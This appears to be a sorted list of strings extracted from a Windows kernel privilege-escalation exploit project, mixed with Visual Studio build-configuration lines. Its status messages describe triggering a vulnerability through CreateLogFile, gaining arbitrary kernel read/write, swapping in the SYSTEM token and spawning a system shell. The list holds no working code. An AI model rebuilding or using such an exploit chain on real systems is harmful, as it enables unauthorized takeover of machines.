reading base of ntoskrnl to check we have arbitrary read/write
resx
returnLength)
swapping tokens...
system
systemtoken = 0xFFFFD401F501C6E9
temp
testlog
tiff
token swapped. Restoring PreviousMode and spawning system shell...
triggering vuln...CreateLogFile failed with error 6601
typedef struct _SYSTEM_HANDLE_INFORMATION
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
undef APSTUDIO_READONLY_SYMBOLS
using fNtQuerySystemInformation = NTSTATUS(WINAPI
using fNtReadVirtualMemory = NTSTATUS(WINAPI
using fNtWriteVirtualMemory = NTSTATUS(WINAPI
vuln triggered
windows11
wwwroot/
x64 = Debug
x64 = Release
x64.ActiveCfg = Debug
x64.ActiveCfg = Release
x64.Build.0 = Debug
x64.Build.0 = Release
x64/
x86 = Debug
x86 = Release
x86.ActiveCfg = Debug
x86.ActiveCfg = Release
x86.Build.0 = Debug
x86.Build.0 = Release
x86/
xsd</Extensions>
{227C72ED-494A-4D29-9170-5E5994C12F5C}.Debug
{227C72ED-494A-4D29-9170-5E5994C12F5C}.Release
